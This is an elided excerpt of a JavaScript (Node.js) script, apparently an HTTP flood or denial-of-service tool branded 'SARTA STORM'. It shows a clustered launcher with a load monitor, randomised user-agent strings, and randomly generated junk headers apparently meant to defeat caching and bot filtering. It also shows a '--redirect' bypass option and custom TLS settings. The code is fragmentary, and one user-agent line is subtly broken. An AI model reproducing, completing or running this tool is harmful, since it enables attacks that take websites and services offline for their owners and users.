...
if (cluster.isMaster) {
    function readServerInfo() {
        ...
        process.stdout.clearLine();
        process.stdout.write(`[!] SARTA STORM InFo: CPU Load: ${load}%, Memory Usage: ${memory}GB, Time: ${currentTime}`.bgRed);
    }
...
const redirect = parseBoolean(getArgumentValue(bypassconnect, "--redirect", false))
    ...
    if (max !== true) {
        uas = `Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36`
    } else {
        uas = `Mozilla/5.0 (Windows NT ${getRandomInt(0,10)}.0; Win${Math.random() < 0.5 ? 32: 64}; x${Math.random() < 0.5 ? 32: 64}) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36` + Math.random < 0.5 ? ` Edg/${nodeii}.${getRandomInt(0,2651)}.0.0` : ''
...
"sec-ch-ua-platform-version": platformVersion,
        ...
        "sec-fetch-site": "none",
        ...(Math.random() < 0.6 ? {
            ["x-cache" ]: "x-" + generateRandomString(1, 5)
        } : {}),
        ...(Math.random() < 0.6 ? {
            ["c-cache" + generateRandomString(3, 4)]: "cache-" +  generateRandomString(4, 5)
        } : {}),
    ...
    if (Math.random() >= 0.5) {
        header = {
            ...header,
            ...(Math.random() < 0.5 ? {
                ["c-rush-" + generateRandomString(3, 6)]: "rush-" +  generateRandomString(4, 8)
            } : {}),
            ...(Math.random() < 0.5 ? {
                "blum-purpose": "0"
            } : {}),
...
if (Math.random() >= 0.5) {
    header = {
        ...header,
        ...(Math.random() < 0.6 ? { [generateRandomString(2, 3) + generateRandomString(2, 3)]: "cache-" + generateRandomString(1, 2) } : {}),
        ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + generateRandomString(2, 3)]: "x-" + generateRandomString(2, 3) } : {}),
    };
}
    ...
    const TLSOPTION = {
        ...
        ecdhCurve: 'X25519:P-256:P-384:secp521r1',
        secure: true,
